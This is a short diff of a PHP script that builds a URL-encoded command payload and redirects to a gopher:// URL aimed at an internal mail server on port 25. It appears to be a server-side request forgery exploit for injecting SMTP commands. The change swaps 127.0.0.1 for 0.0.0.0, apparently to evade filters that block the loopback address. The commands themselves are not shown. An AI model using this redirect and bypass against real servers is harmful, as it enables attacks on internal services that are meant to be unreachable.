@@ -11,5 +11,5 @@
 
         $payload = implode('%0A', $commands);
 
-        header('Location: gopher://127.0.0.1:25/_'.$payload);
+        header('Location: gopher://0.0.0.0:25/_'.$payload);
 ?>
